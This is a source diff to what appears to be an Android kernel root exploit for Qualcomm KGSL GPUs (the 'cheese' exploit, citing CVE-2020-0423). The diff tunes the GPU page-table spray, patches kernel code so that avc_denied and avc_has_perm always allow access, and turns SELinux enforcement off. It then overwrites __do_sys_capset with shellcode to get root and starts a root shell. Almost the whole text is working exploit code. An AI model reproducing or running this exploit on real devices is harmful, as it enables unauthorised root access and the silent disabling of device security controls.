@@ -117,8 +117,8 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
 
 // TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
 // increased this from 1G to 2G for Pixel 3 XL
-// spray 16mb per mapping: 16MB*256=4GB
-#define NPBUFS 256
+// spray 16mb per mapping: 16MB*512=8GB
+#define NPBUFS_MAX 512
 
 #define LEVEL1_SHIFT    30
 #define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
@@ -230,8 +230,6 @@ static void sync_cache_from_gpu(void* start, void* end) {
     }
 }
 
-// #define DUMP_PAGEMAP
-#ifdef DUMP_PAGEMAP
 // https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
 // https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
 uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
@@ -242,7 +240,6 @@ uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
     uint64_t mask = (1ull << 55) - 1; // bits 0-54
     return (pagemap_data & mask) * 4096;
 }
-#endif
 
 #define CP_WAIT_MEM_WRITES 0x12
 #define CP_SET_DRAW_STATE 0x43
@@ -348,10 +345,10 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
 
 const uint64_t kKernelPageTableEntry = 0x1e0;
 
-int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
-#ifdef DUMP_PAGEMAP
-    int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
-#endif
+int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese, uint64_t phyaddr, uint16_t npbufs, bool dumpPagemap) {
+    int pagemap_fd = -1;
+    if(dumpPagemap)
+        pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
 
     // strings - xbl_config.img |grep Kernel
     // 0xA8000000, 0x10000000, "Kernel",            AddMem, SYS_MEM, SYS_MEM_CAP, Reserv, WRITE_BACK_XN
@@ -393,16 +390,16 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
      * it's chosen more or less at random based on results of performing a similar spray and then
      * checking commonly recurring entries in /proc/self/pagemap
      */
-    uint64_t phyaddr = 0xfebeb000;
+    // uint64_t phyaddr;
 
     /* spray 16mb per mapping */
     uint64_t pbuf_len = PAGE_SIZE * 4096;
-    uint8_t *pbufs[NPBUFS];
+    uint8_t *pbufs[NPBUFS_MAX];
 
     /* this loop is spraying a fake page table so that it hopefully lands at a fixed physical
      * address. one way that the exploit can fail is if this page has already been allocated,
      * in which case a reboot might be necessary */
-    for (int i = 0; i < NPBUFS; i++) {
+    for (int i = 0; i < npbufs; i++) {
         uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
 
         if (pbuf == (uint8_t *) MAP_FAILED) {
@@ -426,18 +423,28 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 
         pbufs[i] = pbuf;
         //fprintf(stderr, "spray %p\n", pbuf);
-#ifdef DUMP_PAGEMAP
-        if (pagemap_fd != -1) {
+ 
+        if (dumpPagemap) {
             for (int off = 0; off < pbuf_len; off += 4096) {
                 void* page_start = pbuf + off;
-                fprintf(stderr, "addr: %p %p\n", page_start, (void*)GetPhys(pagemap_fd, (uint64_t)page_start));
+                uint64_t phys = GetPhys(pagemap_fd, (uint64_t)page_start);
+                if(phys  && phys <= 0xFFFFFFFF)
+                    fprintf(stderr, "addr: %p %p\n", page_start, (void*)phys);
             }
         }
-#endif
+
         sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
     }
     // end spray
     //fprintf(stderr, "end spray\n");
+    if (dumpPagemap)
+    {
+        for (int i = 0; i < npbufs; i++) {
+            munmap(pbufs[i], pbuf_len);
+            pbufs[i] = NULL;
+        }
+        return 2;
+    }
 
     int fd = open("/dev/kgsl-3d0", O_RDWR);
     if (fd == -1) {
@@ -488,7 +495,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     void* target_physical_page = NULL;
     int target_pbuf = -1;
 
-    for (int i = 0; i < NPBUFS; i++) {
+    for (int i = 0; i < npbufs; i++) {
         void* pbuf = pbufs[i];
         for (int off = 0; off < pbuf_len; off += 4096) {
             void* page_start = pbuf + off;
@@ -504,7 +511,13 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 
     if (target_pbuf == -1) {
         fprintf(stderr, "can't find target\n");
-        return 1;
+        // ummap to allow call it again without OOM
+        for (int i = 0; i < npbufs; i++) {
+            munmap(pbufs[i], pbuf_len);
+            pbufs[i] = NULL;
+        }
+        // todo: gpu cleanup?
+        return 2;
     }
 
     uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
@@ -588,7 +601,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     }
 
     // we don't need these anymore...
-    for (int i = 0; i < NPBUFS; i++) {
+    for (int i = 0; i < npbufs; i++) {
         munmap(pbufs[i], pbuf_len);
         pbufs[i] = NULL;
     }
@@ -650,35 +663,97 @@ void stupid_setexeccon(const char* con) {
     close(fd);
 }
 
-int main() {
-    g_level1_dcache_size = tu_get_l1_dcache_size();
-#if 1
-    if (!getenv("CHEESE_SKIP_GPU")) {
-        struct cheese_gpu_rw cheese = {};
-        if (cheese_gpu_rw_setup(&cheese)) {
-            fprintf(stderr, "can't get GPU r/w\n");
-            return 1;
-        }
+static bool write_enforce(bool en)
+{
+    FILE *enforce = fopen("/sys/fs/selinux/enforce", "wb");
+    if(enforce)
+    {
+        int ret = fprintf(enforce, "%d\n", !!en);
+        fclose(enforce);
+        return ret > 0;
     }
-#endif
+    return false;
+}
+
+static void stupid_flush_cache(void)
+{
+    // stupidest cache flush: write and run 16MB of nops.
+    uint32_t dumb_cache_flush_size = 0x10000000;
+    void* garbage = mmap(NULL, dumb_cache_flush_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+    volatile uint32_t* garbage_instrs = garbage;
+    for (int i = 0; i < (dumb_cache_flush_size / 4) - 1; i++) {
+        garbage_instrs[i] = 0xd503201f; // nop
+    }
+    garbage_instrs[(dumb_cache_flush_size / 4) - 1] = 0xD65F03C0; // ret
+    void (*garbage_fn)(void) = garbage;
+    garbage_fn();
+    munmap(garbage, dumb_cache_flush_size);
+}
+
+
+char * const*g_argv;
+void segv_cb(int signum)
+{
+    signal(SIGSEGV, SIG_DFL);
+    fprintf(stderr, "got SEGV, setting up ksma\n");
+    uint64_t npbufs = (long long) sysconf (_SC_PHYS_PAGES) * sysconf (_SC_PAGESIZE) / (16*1024*1024) / 1.8;
+    const char *npbufs_env = getenv("CHEESE_SPRAY_COUNT");
+    if(npbufs_env)
+        npbufs = atoi(npbufs_env);
+    if(!npbufs)
+        npbufs = 256;
+    if(npbufs > 512)
+        npbufs = 512;
+    fprintf(stderr, "Usign spray count %d\n", (int)npbufs);
+    uint64_t physaddrs[] = { 0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};
+    for(int i = 0; i < sizeof(physaddrs)/sizeof(physaddrs[0]); i++)
+    {
+        struct cheese_gpu_rw cheese = {};
+        fprintf(stderr, "trying %lx\n", physaddrs[i]);
+        int ret = cheese_gpu_rw_setup(&cheese, physaddrs[i], npbufs, signum == 0);
+
+        if(!ret)
+        {
+            fprintf(stderr, "success, re-running\n");
+            execv(g_argv[0], g_argv);
+        }
+        if(signum)
+            fprintf(stderr, "failed\n");
+        if(ret != 2)
+            break;
+    }
+    _exit(1);
+}
+
+
+
+int main(int argc, char** argv) {
+    g_argv = argv;
+    g_level1_dcache_size = tu_get_l1_dcache_size();
+
+    if(getenv("CHEESE_DUMP_PAGEMAP"))
+        segv_cb(0); // force page spray
     // now check ksma...
-    fprintf(stderr, "about to ksma...\n");
+    fprintf(stderr, "checking ksma...\n");
     void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
     uint64_t ksma_physical_base = 0x80000000;
     //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
+    signal(SIGSEGV, segv_cb);
     uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
     fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
+    signal(SIGSEGV, SIG_DFL);
     uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
     uint64_t kernel_size = *kernel_size_ptr;
     void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;
 
     void* kernel_copy_buf = malloc(kernel_size);
     memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
-#if 0
-    FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
-    fwrite(kernel_copy_buf, 1, kernel_size, f);
-    fclose(f);
-#endif
+    if(getenv("CHEESE_DUMP_KERNEL"))
+    {
+        FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
+        fwrite(kernel_copy_buf, 1, kernel_size, f);
+        fclose(f);
+    }
 
     struct cheese_kallsyms_lookup kallsyms_lookup;
     if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
@@ -695,8 +770,14 @@ int main() {
     }
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
-    *kernel_selinux_state_enforcing_ptr = false;
-    fprintf(stderr, "set selinux enforcing ptr...\n");
+    // first field depends on kernel config, so disabled for now by default
+    // now patch avc_denied instead, patching code seems to work better
+    if(getenv("CHEESE_CLEAR_ENFORCING_BIT"))
+    {
+        bool patch = false;
+        stupid_memcpy(kernel_selinux_state_enforcing_ptr, &patch, sizeof(patch));
+        fprintf(stderr, "set selinux enforcing ptr...\n");
+    }
 
     uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
     if (force_manual_patchfinder || !init_cred_addr) {
@@ -706,6 +787,62 @@ int main() {
 
 #define LO_DWORD(a) (a & 0xffffffff)
 #define HI_DWORD(a) (a >> 32)
+
+    uint64_t kernel_avc_has_perm_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "avc_has_perm");
+    fprintf(stderr, "avc_has_perm is %lx\n", kernel_avc_has_perm_addr);
+    char *kernel_avc_has_perm_ptr = kernel_physical_base + (kernel_avc_has_perm_addr - kernel_virtual_base);
+    uint64_t kernel_slow_avc_audit_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "slow_avc_audit");
+    fprintf(stderr, "slow_avc_audit is %lx\n", kernel_slow_avc_audit_addr);
+    char *kernel_slow_avc_audit_ptr = kernel_physical_base + (kernel_slow_avc_audit_addr - kernel_virtual_base);
+ 
+    // avc_denied return address. Rewrite to always return 0
+    if(!getenv("CHEESE_SKIP_AVC_DENIED_PATCH"))
+    {
+        uint64_t kernel_avc_denied_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "avc_denied");
+        fprintf(stderr, "avc_denied is %lx\n", kernel_avc_denied_addr);
+        uint32_t *kernel_avc_denied_ptr = kernel_physical_base + (kernel_avc_denied_addr - kernel_virtual_base);
+        uint32_t *target_ptr = kernel_avc_denied_ptr + 14;
+        uint32_t needle = 0x12800180; // mov     w0, #-13
+        uint32_t patch = 0x2a1f03e0; // mov w0, wzr
+        
+        fprintf(stderr, "avc_denied target is %x\n", *target_ptr);
+
+        if(*target_ptr == needle) // mov     w0, #-13
+            stupid_memcpy(target_ptr, &patch, sizeof(patch));
+        else if(*target_ptr != patch)
+        {
+            uint32_t ret = 0xd65f03c0; // ret
+            target_ptr = kernel_avc_denied_ptr + 1;
+            for(;;)
+            {
+                if(*target_ptr == ret || target_ptr >= kernel_avc_denied_ptr + 0x80)
+                    fprintf(stderr, "avc_denied patch unsupported!\n"
+                                     "try setting CHEESE_PATCH_OUT_AUDIT or CHEESE_CLEAR_ENFORCING_BIT\n");
+                else if(*target_ptr == needle)
+                    stupid_memcpy(target_ptr, &patch, sizeof(patch));
+                else if(*target_ptr++ != patch)
+                    continue;
+                break;
+            }
+        }
+    }
+
+    if(getenv("CHEESE_PATCH_OUT_AUDIT"))
+    {
+        // patch-out selinux checks...
+        // this might give better performance, removing selinux checks at all
+        uint32_t ret0_code[] = {
+           0xd503233f, //      paciasp
+           0x2A1F03E0, //      mov     w0, wzr
+           0xd50323bf, //      autiasp
+           0xd65f03c0, //      ret
+        };
+  
+        stupid_memcpy(kernel_avc_has_perm_ptr, ret0_code, sizeof(ret0_code));
+        stupid_memcpy(kernel_slow_avc_audit_ptr, ret0_code, sizeof(ret0_code));
+    }
+
+    stupid_flush_cache();
 
     // https://www.longterm.io/cve-2020-0423.html
     uint32_t shellcode[] = {
@@ -725,10 +862,8 @@ int main() {
         0x2A1F03E0, // mov w0, wzr
         0xD65F03C0, // ret
     };
-
     uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
     char* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);
-
     /* Saving sys_capset current code */
     uint8_t sys_capset[sizeof(shellcode)];
     fprintf(stderr, "save...\n");
@@ -738,19 +873,7 @@ int main() {
     stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
 
     sleep(1);
-    // stupidest cache flush: write and run 16MB of nops.
-    {
-        uint32_t dumb_cache_flush_size = 0x1000000;
-        void* garbage = mmap(NULL, dumb_cache_flush_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
-        volatile uint32_t* garbage_instrs = garbage;
-        for (int i = 0; i < (dumb_cache_flush_size / 4) - 1; i++) {
-            garbage_instrs[i] = 0xd503201f; // nop
-        }
-        garbage_instrs[(dumb_cache_flush_size / 4) - 1] = 0xD65F03C0; // ret
-        void (*garbage_fn)(void) = garbage;
-        garbage_fn();
-        munmap(garbage, dumb_cache_flush_size);
-    }
+    stupid_flush_cache();
 
     fprintf(stderr, "call...\n");
     /* Calling our patched version of sys_capset */
@@ -763,6 +886,10 @@ int main() {
         fprintf(stderr, "capset returned %d\n", err);
         return 1;
     }
+    // note: if selinux is enforcing and avc_denied patch failed, stderr does not work here...
+    // TODO: maybe, good place to dump pagemap here
+    // On devices where exploit works very rare and selinux bypass failed, pagemap will help to make it work again
+    // but how to write it without stdout/stderr?
     fprintf(stderr, "restore...\n");
     /* Restoring sys_capset */
     stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
@@ -771,9 +898,23 @@ int main() {
         fprintf(stderr, "failed to get root - rerun?\n");
         return 1;
     }
+    // now try call setenforce. With patched avc_denied it should work
+    for(int i = 0; i < 10; i++)
+    {
+        // cycle until setenforce success, otherwise everything will fail
+        if(write_enforce(0))
+        {
+            if(fprintf(stderr, "write enforce ok\n") > 0)
+                break;
+        }
+        stupid_flush_cache();
+        sleep(1);
+        stupid_flush_cache();
+    }
 
     stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
-    execl("/system/bin/sh", "sh", NULL);
+    argv[0] = "sh";
+    execv("/system/bin/sh", argv);
     fprintf(stderr, "can't exec?\n");
 
     return 0;
